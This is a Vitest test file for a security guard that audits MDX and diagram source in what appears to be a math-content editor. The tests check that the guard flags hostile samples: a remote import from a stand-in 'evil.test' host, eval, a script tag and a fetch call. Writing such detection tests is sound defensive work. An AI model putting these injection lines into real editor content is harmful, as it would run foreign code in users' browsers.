import { describe, expect, it } from 'vitest';
import { auditEditorSource } from '@/fixed-pages/editor/security/contentGuard';

describe('contentGuard', () => {
  it('allows corpus-shaped MDX imports and metadata export', () => {
    const source = `import { Pitagoras } from '@content/diagrams/Teoremas/Pitagoras';
export const metadata = { id: 'x', type: 'teorema', title: 'T' };
export const Simulation = Pitagoras;

Un segmento.
`;
    expect(auditEditorSource('mdx', source)).toEqual([]);
  });

  it('blocks MDX plugin imports and injection', () => {
    const findings = auditEditorSource('mdx', `import evil from 'https://evil.test/x';
export const metadata = { id: 'x', type: 'teorema', title: 'T' };
{eval('1')}
<script>alert(1)</script>
`);
    expect(findings.map(item => item.code)).toEqual(expect.arrayContaining([
      'security-import-path',
      'security-eval',
      'security-script-tag',
    ]));
    expect(findings.some(item => item.code === 'security-mdx-expression')).toBe(false);
  });

  it('allows generated diagram source and blocks foreign plugins', () => {
    const safe = `import { createDiagramSpec, DiagramRenderer } from '@/diagrams/public';
export const FooSpec = createDiagramSpec({ version: 3 });
export const Foo = () => <DiagramRenderer spec={FooSpec} />;
`;
    expect(auditEditorSource('diagram', safe)).toEqual([]);

    const evil = `import hack from 'lodash';
export const Foo = () => { fetch('https://evil.test'); return null; };
`;
    expect(auditEditorSource('diagram', evil).map(item => item.code)).toEqual(expect.arrayContaining([
      'security-import-plugin',
      'security-fetch',
    ]));
  });
});
